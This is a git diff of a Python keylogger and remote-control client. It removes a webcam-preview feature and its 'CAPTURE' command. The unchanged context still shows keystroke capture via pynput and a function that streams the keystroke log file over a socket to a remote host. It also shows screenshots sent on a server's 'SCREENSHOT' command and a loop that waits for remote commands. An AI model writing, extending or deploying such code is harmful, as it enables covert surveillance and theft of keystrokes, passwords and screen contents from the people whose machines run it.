@@ -1,4 +1,4 @@
-import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui, threading, cv2
+import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui, threading
 
 from pynput.keyboard import Key, Listener
 
@@ -49,7 +49,7 @@ def send_log_file(filename, host, port, last_position):
                     sock.send(file_data)
                     file_data = file.read(1024)
                 last_position = file.tell()
-        print(f"\nLog file sent")
+        print(f"Log file sent")
         return last_position
     except socket.error:
         print('Server unreachable ! The log file will be sent later')
@@ -74,35 +74,12 @@ def take_screenshot(host, port):
         print('Server unreachable ! The screenshot will be sent later')
 
 
-# Function to open the webcam
-def open_webcam():
-    cv2.namedWindow("preview")
-    vc = cv2.VideoCapture(0)
-
-    if vc.isOpened():
-        rval, frame = vc.read()
-    else:
-        rval = False
-
-    while rval:
-        cv2.imshow("preview", frame)
-        rval, frame = vc.read()
-        key = cv2.waitKey(20)
-        if key == 27 or cv2.getWindowProperty('preview', cv2.WND_PROP_VISIBLE) < 1:
-            break
-
-    vc.release()
-    cv2.destroyWindow("preview")
-
-
 def receive_server_commands(host, port):
     with socket.create_connection((host, port)) as client_socket:
         while True:
             try:
                 command = client_socket.recv(1024).decode()
-                if command == 'CAPTURE':
-                    open_webcam()
-                elif command == 'SCREENSHOT':
+                if command == 'SCREENSHOT':
                     take_screenshot(host, port)
             except socket.error:
                 print('Error receiving command from server')
